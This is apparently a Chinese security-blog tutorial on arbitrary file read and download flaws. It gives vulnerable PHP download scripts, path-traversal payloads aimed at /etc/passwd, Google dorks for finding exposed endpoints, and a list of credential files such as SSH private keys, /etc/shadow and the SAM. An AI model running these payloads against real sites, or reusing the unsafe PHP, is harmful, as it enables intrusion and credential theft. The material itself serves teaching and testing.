<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">	$file_path = $_GET[&#x27;file&#x27;];</span><br><span class="line">	file_exists($file_path) or die(&#x27;指定文件不存在&#x27;);</span><br><span class="line"></span><br><span class="line">	$file_name = basename($file_path);</span><br><span class="line">	$file_size = filesize($file_path);</span><br><span class="line">	readfile($file_path);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//设置响应头</span><br><span class="line">	header(&#x27;content-Type:application/octet-stream&#x27;);</span><br><span class="line">	header(&#x27;Accept-Ranges:bytes&#x27;);</span><br><span class="line">	header(&#x27;Accept-Length:&#x27;.$file_size);</span><br><span class="line">	header(&#x27;Content-Disposition:attachment;filename=&#x27;.$file_name)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* 文件下载</span><br><span class="line">*</span><br><span class="line">**/</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">download($_GET[&#x27;filename&#x27;], &#x27;magento下载&#x27;);</span><br><span class="line"></span><br><span class="line">function download($file, $down_name)&#123;</span><br><span class="line">$suffix = substr($file,strrpos($file,&#x27;.&#x27;)); //获取文件后缀</span><br><span class="line">$down_name = $down_name.$suffix; //新文件名，就是下载后的名字</span><br><span class="line"></span><br><span class="line">//判断给定的文件存在与否</span><br><span class="line">if(!file_exists($file))&#123;</span><br><span class="line">die(&quot;您要下载的文件已不存在，可能是被删除&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$fp = fopen($file,&quot;r&quot;);</span><br><span class="line">$file_size = filesize($file);</span><br><span class="line">//下载文件需要用到的头</span><br><span class="line">header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">header(&quot;Accept-Ranges: bytes&quot;);</span><br><span class="line">header(&quot;Accept-Length:&quot;.$file_size);</span><br><span class="line">header(&quot;Content-Disposition: attachment; filename=&quot;.$down_name);</span><br><span class="line">$buffer = 1024;</span><br><span class="line">$file_count = 0;</span><br><span class="line">//向浏览器返回数据</span><br><span class="line">while(!feof($fp) &amp;&amp; $file_count &lt; $file_size)&#123;</span><br><span class="line">$file_con = fread($fp,$buffer);</span><br><span class="line">$file_count += $buffer;</span><br><span class="line">echo $file_con;</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile.php?file=/etc/passwd</span><br><span class="line"></span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>

<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以用Google hacking或Web漏洞扫描器</span><br><span class="line"></span><br><span class="line">从链接上看，形如：</span><br><span class="line">    • readfile.php?file=***.txt</span><br><span class="line">    • download.php?file=***.rar</span><br><span class="line"></span><br><span class="line">从参数名看，形如：</span><br><span class="line">    • &amp;RealPath= </span><br><span class="line">    • &amp;FilePath= </span><br><span class="line">    • &amp;ﬁlepath= </span><br><span class="line">    • &amp;Path= </span><br><span class="line">    • &amp;path= </span><br><span class="line">    • &amp;inputFile= </span><br><span class="line">    • &amp;url= </span><br><span class="line">    • &amp;urls= </span><br><span class="line">    • &amp;Lang= </span><br><span class="line">    • &amp;dis= </span><br><span class="line">    • &amp;data= </span><br><span class="line">    • &amp;readﬁle= </span><br><span class="line">    • &amp;ﬁlep= </span><br><span class="line">    • &amp;src= </span><br><span class="line">    • &amp;menu= </span><br><span class="line">    • META-INF </span><br><span class="line">    • WEB-INF</span><br></pre></td></tr></table></figure>

<h4 id="Google-search"><a href="#Google-search" class="headerlink" title="Google search"></a>Google search</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:&quot;readfile.php?file=“</span><br><span class="line"></span><br><span class="line">inurl:&quot;read.php?filename=“</span><br><span class="line"></span><br><span class="line">inurl:&quot;download.php?file=“</span><br><span class="line"></span><br><span class="line">inurl:&quot;down.php?file=&quot;</span><br><span class="line">等等...</span><br></pre></td></tr></table></figure>

<h4 id="敏感文件-x2F-目录"><a href="#敏感文件-x2F-目录" class="headerlink" title="敏感文件&#x2F;目录"></a>敏感文件&#x2F;目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">   C:\boot.ini  //查看系统版本</span><br><span class="line">   C:\Windows\System32\inetsrv\MetaBase.xml 	 //IIS配置文件</span><br><span class="line">   C:\Windows\repair\sam  				//存储系统初次安装的密码</span><br><span class="line">   C:\Program Files\mysql\my.ini  			//Mysql配置</span><br><span class="line">   C:\Program Files\mysql\data\mysql\user.MYD  	//Mysql root</span><br><span class="line">   C:\Windows\php.ini  				//php配置信息</span><br><span class="line">   C:\Windows\my.ini  				//Mysql配置信息</span><br><span class="line">   ...</span><br><span class="line">Linux：</span><br><span class="line">   /root/.ssh/authorized_keys</span><br><span class="line">   /root/.ssh/id_rsa</span><br><span class="line">   /root/.ssh/id_ras.keystore</span><br><span class="line">   /root/.ssh/known_hosts</span><br><span class="line">   /etc/passwd</span><br><span class="line">   /etc/shadow</span><br><span class="line">   /etc/my.cnf</span><br><span class="line">   /etc/httpd/conf/httpd.conf</span><br><span class="line">   /root/.bash_history</span><br><span class="line">   /root/.mysql_history</span><br><span class="line">   /proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">   /proc/mounts</span><br><span class="line">   /porc/config.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• index.php?f=../../../../../../etc/passwd </span><br><span class="line"></span><br><span class="line">• index.php?f=../index.php </span><br><span class="line"></span><br><span class="line">• index.php?f=ﬁle:///etc/passwd</span><br><span class="line"></span><br><span class="line">注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，</span><br><span class="line">    若显示源码或提示下载则是文件查看与下载漏洞</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
